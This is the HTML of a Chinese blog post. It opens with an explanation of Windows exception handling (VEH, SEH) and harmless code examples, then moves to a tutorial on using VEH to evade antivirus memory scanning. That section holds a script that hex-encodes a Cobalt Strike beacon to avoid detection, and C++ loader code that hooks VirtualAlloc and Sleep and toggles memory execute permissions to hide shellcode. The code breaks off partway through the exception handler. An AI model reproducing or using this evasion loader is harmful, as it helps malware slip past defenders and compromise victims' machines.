@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap"></h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-10-22T08:51:11.607Z" itemprop="datePublished">2023-10-22</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-08-25T18:09:52.000Z" itemprop="dateUpdated">2023-08-26</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <p>CPU检测到异常 -&gt; 查中断表执行处理函数 -&gt; CommonDispatchException -&gt; KiDispatchException -&gt;  KiUserExceptionDispatcher -&gt; RtlDispatchException -&gt; VEH -&gt; SEH</p>
+<p> CPU异常执行的流程</p>
+<p> 1、CPU指令检测到异常</p>
+<p> 2、查IDT表，执行中断处理函数</p>
+<p> 3、调用CommonDispatchException(构建EXCEPTION_RECORD)</p>
+<p> 4、KiDispatchException(分发异常：目的是找到异常的处理函数)</p>
+<h1 id="Windows异常处理流程"><a href="#Windows异常处理流程" class="headerlink" title="Windows异常处理流程"></a>Windows异常处理流程</h1><p>在Windows中，异常处理的机制包括向量异常处理（VEH）、结构化异常处理（SEH）和C++异常处理（C++EH）。当发生异常时，它们的执行顺序如下：</p>
+<ol>
+<li><strong>终止当前程序的执行</strong>：首先，异常导致当前指令的执行被终止。CPU然后开始查找可以处理异常的代码。</li>
+<li><strong>调试器</strong>：如果进程正在被调试，操作系统会首先将异常通知给调试器。调试器可以选择处理异常，或者让操作系统继续其正常的异常处理流程。</li>
+<li><strong>向量异常处理（VEH）</strong>：如果存在VEH处理器，它们将首先得到机会处理异常。VEH处理器按照它们注册的顺序被调用，如果任何一个VEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的VEH处理器和SEH处理器将不会被调用。</li>
+<li><strong>结构化异常处理（SEH）</strong>：如果所有的VEH处理器都无法处理异常，或者没有注册VEH处理器，操作系统会开始调用SEH处理器。SEH处理器按照它们在堆栈中的顺序（即反注册的顺序）被调用，如果任何一个SEH处理器处理了异常（即返回<code>EXCEPTION_CONTINUE_EXECUTION</code>），则后续的SEH处理器将不会被调用。</li>
+<li><strong>C++异常处理（C++EH）</strong>：如果所有的SEH处理器都无法处理异常，或者没有注册SEH处理器，且异常是一个C++异常（即由C++的<code>throw</code>语句抛出的异常），则会调用C++的异常处理器。</li>
+<li><strong>如果所有的异常处理器都无法处理异常</strong>：如果所有的异常处理器都无法处理异常，或者没有注册任何异常处理器，操作系统通常会终止当前进程，并显示一个错误消息。</li>
+</ol>
+<p>在这个过程中，VEH处理器是优先于SEH处理器被调用的，这是因为VEH处理器更加灵活，可以用来处理一些在SEH中难以处理的异常情况。例如，当发生堆栈溢出时，由于SEH处理器需要使用堆栈来执行，因此无法处理这种异常，但VEH处理器则可以处理</p>
+<h1 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>向量异常处理（Vectored Exception Handling，VEH）是 Windows 提供的一种异常处理机制，可以用 <code>AddVectoredExceptionHandler</code> 函数来添加一个向量异常处理器（vectored exception handler）。这个函数需要两个参数：第一个参数指定处理器的优先级，如果为 <code>TRUE</code>，处理器将被添加到链表的开始，如果为 <code>FALSE</code>，处理器将被添加到链表的末尾；第二个参数是指向处理器函数的指针</p>
+<h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><p>以下代码中的<code>idiv ecx</code>指令是用于将寄存器的EDX:EAX的值除以ECX寄存器的值，并将结果放入EAX中，将余数放入EDX中</p>
+<blockquote>
+<p>在x86架构的CPU中，EDX和EAX是32位寄存器。在进行一些特定的操作（比如长除法和长乘法）时，这两个寄存器会一起使用，形成一个64位的值。其中，EDX是高32位，EAX是低32位</p>
+</blockquote>
+<p>在下述代码中， “xor ecx, ecx” 指令将 ECX 寄存器的值设置为 0。当你尝试执行 “idiv ecx” 指令时，就相当于试图用 0 作为除数进行除法运算。在数学中，用 0 作为除数是没有定义的，因此 CPU 会触发一个异常，即你所看到的 0xC0000094</p>
+<p>这个异常被你的 VEH 函数捕获，然后修复了异常状态（通过将 ECX 寄存器的值修改为 1），并告诉操作系统继续执行程序。这就是为什么你的程序在除法操作之后能够继续运行，打印出 “veh_code run here again” 的原因</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个函数指针类型，该函数是用来添加VEH（向量异常处理程序）的</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个指向FnAddVectoredExceptionHandler类型的函数指针变量</span></span><br><span class="line">FnAddVectoredExceptionHandler MyAddVectoredExceptionHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向量异常处理程序。该函数可以返回两种值：EXCEPTION_CONTINUE_EXECUTION 表示已处理异常，EXCEPTION_CONTINUE_SEARCH 表示未处理异常</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">VectExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当异常发生时，弹出一个消息框提示异常已发生</span></span><br><span class="line">    ::<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;VEH Function run&quot;</span>, <span class="string">&quot;VEH error&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否发生了除0异常（异常代码0xC0000094），如果是，则处理异常并继续执行程序</span></span><br><span class="line">    <span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xC0000094</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 修改寄存器ECX的值为1，避免再次发生除0异常</span></span><br><span class="line">        pExcepInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回EXCEPTION_CONTINUE_EXECUTION表示异常已被处理，程序可以继续执行</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果发生的异常不是我们想要处理的，返回EXCEPTION_CONTINUE_SEARCH表示异常未处理，系统需要寻找其他的异常处理程序来处理这个异常</span></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加向量异常处理程序并测试它</span></span><br><span class="line"><span class="function">VOID <span class="title">VEH</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用MyAddVectoredExceptionHandler函数，将VectExceptionHandler函数添加到VEH链表的头部</span></span><br><span class="line">    <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, VectExceptionHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟发生一个除0异常，用于测试我们的VEH函数是否可以正常工作</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">xor</span> edx, edx</span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">        mov eax, <span class="number">0x10</span></span><br><span class="line">        idiv ecx <span class="comment">// EDX:EAX 除以 ECX，由于ECX为0，所以这里会发生除0异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果VEH函数正确地处理了异常，那么程序将会继续执行到这里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;veh_code run here again&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用VEH函数，添加向量异常处理程序并测试它</span></span><br><span class="line">    <span class="built_in">VEH</span>();</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
+<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常</p>
+<h2 id="代码实例-1"><a href="#代码实例-1" class="headerlink" title="代码实例"></a>代码实例</h2><p>在下述例子中，<code>CauseException</code> 函数尝试对空指针进行解引用，这会引发一个访问违规（access violation）异常。这个异常在 <code>main</code> 函数的 <code>__try</code> 块中被捕获，并在 <code>__except</code> 块中被处理</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CauseException</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">nullptr</span>;</span><br><span class="line">    *p = <span class="number">0</span>;  <span class="comment">// This will cause an access violation exception</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="built_in">CauseException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    __except(EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Caught an exception\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="使用VEH绕过内存查杀"><a href="#使用VEH绕过内存查杀" class="headerlink" title="使用VEH绕过内存查杀"></a>使用VEH绕过内存查杀</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在今天的高级网络威胁环境中，恶意软件需要采取复杂的策略来避免被安全软件检测。其中一种策略就是动态地更改执行内存的属性。</p>
+<p>通常，杀毒软件会扫描进程中带有可执行属性的内存区域，这是因为它们可能包含恶意代码。</p>
+<p>然而，如果我们在适当的时机去除内存区域的可执行属性，就可以避免这种扫描，从而避开杀毒软件的侦查。但是，问题在于，如果我们去除内存的可执行属性，恶意代码就无法运行了。</p>
+<p>不过，我们可以利用Windows的异常处理机制，在需要运行恶意代码的时候临时恢复其可执行属性。然后，当代码进入休眠状态时，我们再次去除其可执行属性，使其隐藏起来。这样，恶意代码就可以在需要的时候运行，而在不需要的时候则隐藏起来，避开杀毒软件的侦查。</p>
+<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>1.使用 <code>AddVectoredExceptionHandler</code> 注册一个异常处理函数 <code>FirstVectExcepHandler</code>，这个函数会在发生异常时被调用。当程序访问了一个非法的内存地址（如访问一个没有权限的内存区域）时，系统会引发一个异常，这时异常处理函数就会被调用</p>
+<p>2.使用 <code>Hook()</code> 函数钩住 <code>VirtualAlloc</code> 和 <code>Sleep</code> 两个系统函数。这样，每次调用这两个函数时，实际上都会执行我们定义的 <code>NewVirtualAlloc</code> 和 <code>NewSleep</code> 函数，其中<code>NewVirtualAlloc</code> 函数用于记录分配的内存区域的地址和大小，以便后续操作</p>
+<p>3.<code>NewSleep</code> 函数中，首次调用时，会释放之前分配的内存，然后唤醒 <code>Beacon_set_Memory_attributes</code> 线程，这个线程会修改内存区域的权限为 PAGE_READWRITE，也就是只有读写权限，没有执行权限</p>
+<p>4.<code>FirstVectExcepHandler</code> 是注册的异常处理函数，当访问的内存区域没有执行权限时，会产生一个异常，这时这个函数会被调用。这个函数首先判断异常是否是访问违规（代码 0xc0000005），并且是否是在我们之前记录的内存区域内，如果是，就将内存区域的权限修改为 PAGE_EXECUTE_READWRITE，也就是添加了执行权限，并让程序继续执行</p>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>首先使用python写一个将二进制文件转换成16进制字符串并保存到txt文件的脚本，这是因为CobaltStrike生成的bin文件会报毒，需对其进行处理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的库</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要转换的二进制文件路径</span></span><br><span class="line">bin_file_path = <span class="string">&quot;cobalt_strike.bin&quot;</span></span><br><span class="line"><span class="comment"># 指定转换结果保存的txt文件路径</span></span><br><span class="line">txt_file_path = <span class="string">&quot;cobalt_strike_hex.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二进制文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(bin_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制内容转换为16进制字符串</span></span><br><span class="line">hex_content = binascii.hexlify(bin_content).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将16进制字符串保存到txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(txt_file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex_content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换完成，16进制内容已保存到&#123;&#125;中&quot;</span>.<span class="built_in">format</span>(txt_file_path))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下代码是利用VEH异常处理绕过内存查杀的主要实现</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detver.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量声明</span></span><br><span class="line">LPVOID Beacon_address; <span class="comment">// Beacon内存地址</span></span><br><span class="line">SIZE_T Beacon_data_len; <span class="comment">// Beacon内存长度</span></span><br><span class="line">DWORD Beacon_Memory_address_flOldProtect; <span class="comment">// Beacon内存属性</span></span><br><span class="line">HANDLE hEvent; <span class="comment">// 事件句柄</span></span><br><span class="line"></span><br><span class="line">BOOL Vir_FLAG = TRUE; <span class="comment">// 感染标记</span></span><br><span class="line">LPVOID shellcode_addr; <span class="comment">// shellcode内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义两个指向原函数的指针，分别是Sleep和VirtualAlloc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">VOID</span><span class="params">(WINAPI* OldSleep)</span><span class="params">(DWORD dwMilliseconds)</span> </span>= Sleep;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">LPVOID</span> <span class="params">(WINAPI *OldVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>= VirtualAlloc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义Sleep和VirtualAlloc的钩子函数</span></span><br><span class="line"><span class="function">LPVOID WINAPI <span class="title">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> </span>&#123;</span><br><span class="line">	Beacon_data_len = dwSize;</span><br><span class="line">	Beacon_address = <span class="built_in">OldVirtualAlloc</span>(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Size:%d\n&quot;</span>, Beacon_data_len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Memory Allocation Address:%llx \n&quot;</span>, Beacon_address);</span><br><span class="line">	<span class="keyword">return</span> Beacon_address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Vir_FLAG)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Free Memory Address:%llx\n&quot;</span>, shellcode_addr);</span><br><span class="line">		<span class="built_in">VirtualFree</span>(shellcode_addr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		Vir_FLAG = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The time of Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	<span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line">	<span class="built_in">OldSleep</span>(dwMilliseconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对函数进行inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourRestoreAfterWith</span>(); <span class="comment">//避免重复HOOK</span></span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>(); <span class="comment">// 开始HOOK</span></span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourAttach</span>((PVOID*)&amp;OldSleep, NewSleep);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>(); <span class="comment">//  提交HOOK</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除对函数的inlineHook</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">	<span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">	<span class="built_in">DetourDetach</span>((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	<span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断异常代码的地址是否在Beacon内存的范围之内</span></span><br><span class="line"><span class="function">BOOL <span class="title">is_Exception</span><span class="params">(DWORD64 Exception_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Exception_addr &lt; ((DWORD64)Beacon_address + Beacon_data_len) &amp;&amp; Exception_addr &gt;(DWORD64)Beacon_address)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address is a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Exception Address not a match:%llx\n&quot;</span>, Exception_addr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义VEH的异常处理函数</span></span><br><span class="line"><span class="function">LONG NTAPI <span class="title">FirstVectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FirstVectExcepHandler\n&quot;</span>);</span><br><span class="line">	<span 